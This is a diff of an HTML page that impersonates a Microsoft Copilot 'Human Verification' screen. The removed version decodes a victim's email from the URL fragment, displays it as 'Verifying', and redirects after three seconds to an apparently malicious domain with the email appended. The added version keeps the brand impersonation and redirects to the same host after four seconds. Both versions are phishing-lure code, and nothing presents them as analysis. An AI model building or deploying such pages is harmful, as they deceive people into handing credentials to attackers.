@@ -1,82 +1,38 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Human Verification</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #FFFFFF;
-            color: white;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        .logo {
-      width: 100px;
-      height: 100px;
-      background: url('https://1000logos.net/wp-content/uploads/2023/11/Copilot-Logo-768x432.png') no-repeat center/contain;
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      background: #FFFFFF;
+      margin: 0;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .logo {
+      width: 150px;
+      height: 150px;
+      background: url('https://cdn-hhgpp.nitrocdn.com/reGDaOLwUcMPtThRYxnreGlXIzZDMKag/assets/images/optimized/rev-e1ef053/cloud9infosystems.com/wp-content/uploads/2024/05/copilot.jpg') no-repeat center/contain;
       animation: pulse 1.5s infinite ease-in-out;
     }
     @keyframes pulse {
       0% { transform: scale(1); opacity: 0.8; }
       50% { transform: scale(1.1); opacity: 1; }
       100% { transform: scale(1); opacity: 0.8; }
-        }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 5px solid rgba(255, 255, 255, 0.1);
-            border-top-color: #FFFFFF;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 15px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .message {
-            margin: 15px;
-        }
-    </style>
+    }
+  </style>
 </head>
 <body>
-    <script>
-        (function(){
-            let email = window.location.hash.substring(1);
-            try {
-                let decodedEmail = atob(email);
-                if (decodedEmail.includes('@')) {
-                    email = decodedEmail;
-                }
-            } catch (e) {}
+  <div class="logo"></div>
 
-            if (!email || !email.includes('@')) {
-                email = '';
-            }
-
-            const domain = email ? email.split('@').pop().toLowerCase() : 'adobe.com';
-            const logoUrl = `https://1000logos.net/wp-content/uploads/2023/11/Copilot-Logo-768x432.png`;
-            const targetUrl = email ? `https://06.zeacreze.com.de/AQBiHa@54cYLc58/${email}` : 'https://06.zeacreze.com.de/AQBiHa@54cYLc58/';
-
-            document.body.innerHTML = `
-                <img id="logo" class="logo" src="${logoUrl}" alt="${domain} Logo" onerror="this.src='https://logo.clearbit.com/adobe.com'" />
-                <p class="message" id="userEmail">Verifying: ${email || 'No Email Provided'}</p>
-                <div class="spinner"></div>
-                <p class="message" id="statusMsg">Please wait while we complete the verification...</p>
-            `;
-
-            setTimeout(() => {
-                window.location.href = targetUrl;
-            }, 3000);
-        })();
-    </script>
+  <script>
+    setTimeout(() => {
+      window.location.href = "https://06.zeacreze.com.de/AQBiHa@54cYLc58/$";
+    }, 4000); // 4-second delay
+  </script>
 </body>
 </html>
